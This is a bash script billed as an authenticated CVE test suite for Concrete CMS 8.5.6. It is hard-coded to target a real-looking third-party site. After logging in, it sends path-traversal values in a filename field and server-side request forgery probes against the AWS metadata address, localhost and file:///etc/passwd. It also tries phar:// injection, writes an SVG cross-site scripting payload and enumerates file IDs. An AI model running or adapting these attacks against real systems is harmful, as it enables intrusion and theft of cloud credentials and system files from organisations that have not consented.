#!/bin/bash
# Authenticated CVE Testing Suite for Concrete CMS 8.5.6
# Run this AFTER obtaining valid credentials
#
# Usage: ./test_authenticated_cves.sh <username> <password>

if [ $# -lt 2 ]; then
    echo "Usage: $0 <username> <password>"
    echo "Example: $0 test@example.com MyPassword123"
    exit 1
fi

USERNAME="$1"
PASSWORD="$2"
COOKIES="/tmp/concrete_auth_cookies.txt"
BASE_URL="https://jobs.dnv.com"

echo "=========================================="
echo "  Concrete CMS 8.5.6 - Authenticated CVE Tests"
echo "  Target: $BASE_URL"
echo "=========================================="
echo ""

# Step 1: Authenticate
echo "[1] Logging in as $USERNAME..."
TOKEN=$(curl -c "$COOKIES" -s "${BASE_URL}/index.php?cID=156%00" | grep -oP 'name="ccm_token" value="\K[^"]+')

if [ -z "$TOKEN" ]; then
    echo "❌ Failed to get CSRF token"
    exit 1
fi

echo "   Token: $TOKEN"

LOGIN_RESPONSE=$(curl -b "$COOKIES" -c "$COOKIES" -s -L \
    -X POST "${BASE_URL}/login/authenticate/concrete" \
    -H "Referer: ${BASE_URL}/index.php/login" \
    -H "Origin: ${BASE_URL}" \
    -d "uName=${USERNAME}&uPassword=${PASSWORD}&ccm_token=${TOKEN}" \
    -w "\nHTTP_CODE:%{http_code}")

HTTP_CODE=$(echo "$LOGIN_RESPONSE" | grep "HTTP_CODE" | cut -d: -f2)

if echo "$LOGIN_RESPONSE" | grep -q "dashboard\|ccm-dashboard"; then
    echo "✅ Login successful!"
else
    echo "❌ Login failed (HTTP $HTTP_CODE)"
    echo "$LOGIN_RESPONSE" | head -20
    exit 1
fi

# Step 2: Test CVE-2021-40097 - Path Traversal to RCE
echo -e "\n[2] Testing CVE-2021-40097: Path Traversal to RCE..."
curl -b "$COOKIES" -s "${BASE_URL}/index.php/dashboard/reports/forms%00" | grep -i "form" | head -5

# Check for external form creation
curl -b "$COOKIES" -s "${BASE_URL}/index.php/dashboard/reports/forms/add_external%00" -o /dev/null -w "  External form add: HTTP %{http_code}\n"

# Step 3: Test CVE-2021-40098 - Path Traversal via External Form
echo -e "\n[3] Testing CVE-2021-40098: External Form Path Traversal..."

# Get new token for this action
TOKEN=$(curl -b "$COOKIES" -s "${BASE_URL}/index.php/dashboard/reports/forms%00" | grep -oP 'name="ccm_token" value="\K[^"]+' | head -1)

# Attempt to create external form with path traversal
curl -b "$COOKIES" -s \
    -X POST "${BASE_URL}/index.php/dashboard/reports/forms/add_external" \
    -d "filename=../../../../tmp/test.txt&ccm_token=$TOKEN" \
    -w "  HTTP %{http_code}\n"

# Step 4: Test CVE-2021-40103 - SSRF via File Import
echo -e "\n[4] Testing CVE-2021-40103: SSRF via File Import..."
curl -b "$COOKIES" -s "${BASE_URL}/index.php/dashboard/files/add_file%00" -o /dev/null -w "  File add page: HTTP %{http_code}\n"

# Test remote file import
TOKEN=$(curl -b "$COOKIES" -s "${BASE_URL}/index.php/dashboard/files/add_file%00" | grep -oP 'name="ccm_token" value="\K[^"]+' | head -1)

# SSRF Test 1: AWS Metadata
echo "  Testing AWS metadata SSRF..."
curl -b "$COOKIES" -s \
    -X POST "${BASE_URL}/index.php/tools/required/files/importers/remote" \
    -d "url=http://169.254.169.254/latest/meta-data/&ccm_token=$TOKEN" \
    -w "  HTTP %{http_code}\n" | head -10

# SSRF Test 2: Internal localhost
echo "  Testing localhost SSRF..."
curl -b "$COOKIES" -s \
    -X POST "${BASE_URL}/index.php/tools/required/files/importers/remote" \
    -d "url=http://localhost:80&ccm_token=$TOKEN" \
    -w "  HTTP %{http_code}\n"

# SSRF Test 3: Path traversal in file read
echo "  Testing path traversal..."
curl -b "$COOKIES" -s \
    -X POST "${BASE_URL}/index.php/tools/required/files/importers/remote" \
    -d "url=file:///etc/passwd&ccm_token=$TOKEN" \
    -w "  HTTP %{http_code}\n"

# Step 5: Test CVE-2021-40102 - PHAR Deserialization
echo -e "\n[5] Testing CVE-2021-40102: PHAR Deserialization (File Delete)..."
echo "  ⚠️  Skipping - requires PHAR file creation and upload"
echo "  Manual test: Upload PHAR file with malicious metadata"

# Step 6: Test CVE-2021-36766 - PHAR Protocol Abuse
echo -e "\n[6] Testing CVE-2021-36766: PHAR Protocol in Directory Input..."
curl -b "$COOKIES" -s "${BASE_URL}/index.php/dashboard/files/search%00" -o /dev/null -w "  File search: HTTP %{http_code}\n"

# Try phar:// in directory path
TOKEN=$(curl -b "$COOKIES" -s "${BASE_URL}/index.php/dashboard/files%00" | grep -oP 'name="ccm_token" value="\K[^"]+' | head -1)
curl -b "$COOKIES" -s \
    -X POST "${BASE_URL}/index.php/dashboard/files/search" \
    -d "folder=phar:///tmp/test.phar&ccm_token=$TOKEN" \
    -w "  HTTP %{http_code}\n"

# Step 7: Test CVE-2021-40104 - SVG Sanitizer Bypass
echo -e "\n[7] Testing CVE-2021-40104: SVG Sanitizer Bypass..."
echo "  Creating malicious SVG..."

# Create SVG with XSS
SVG_PAYLOAD='<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>'
echo "$SVG_PAYLOAD" > /tmp/xss_test.svg

echo "  ⚠️  Manual test required:"
echo "  1. Go to: ${BASE_URL}/index.php/dashboard/files/add_file"
echo "  2. Upload: /tmp/xss_test.svg"
echo "  3. View the SVG file inline"
echo "  4. Check if XSS executes"

# Step 8: Test CVE-2021-40105 - XSS in Markdown Editor
echo -e "\n[8] Testing CVE-2021-40105: XSS in Markdown Editor..."
curl -b "$COOKIES" -s "${BASE_URL}/index.php/dashboard/system/conversations/settings%00" -o /dev/null -w "  Conversation settings: HTTP %{http_code}\n"

echo "  ⚠️  Manual test required:"
echo "  1. Enable conversations with Markdown editor"
echo "  2. Create conversation with XSS payload in Markdown"
echo "  3. Check if payload executes"

# Step 9: Check File Manager for IDOR (CVE-2021-22967)
echo -e "\n[9] Testing File Access (IDOR)..."
for i in $(seq 1 20); do
    RESPONSE=$(curl -b "$COOKIES" -s "${BASE_URL}/index.php/download_file/view_inline/$i" -w "HTTP:%{http_code}")
    if echo "$RESPONSE" | grep -q "HTTP:200"; then
        echo "  fID=$i accessible"
    fi
done

# Step 10: Dashboard Info Disclosure
echo -e "\n[10] Checking Dashboard Information Disclosure..."
curl -b "$COOKIES" -s "${BASE_URL}/index.php/dashboard/system/environment/info%00" -o /dev/null -w "  Environment info: HTTP %{http_code}\n"
curl -b "$COOKIES" -s "${BASE_URL}/index.php/dashboard/system/update%00" -o /dev/null -w "  Update page: HTTP %{http_code}\n"

echo -e "\n=========================================="
echo "  Testing Complete!"
echo "=========================================="
echo ""
echo "Review the output above for:"
echo "  ✅ Successful exploits (200 responses with sensitive data)"
echo "  ⚠️  Potential vulnerabilities (unusual responses)"
echo "  ❌ Blocked attempts (403/404)"
echo ""
echo "Cookies saved to: $COOKIES"
echo "Session valid for: ~30 minutes"
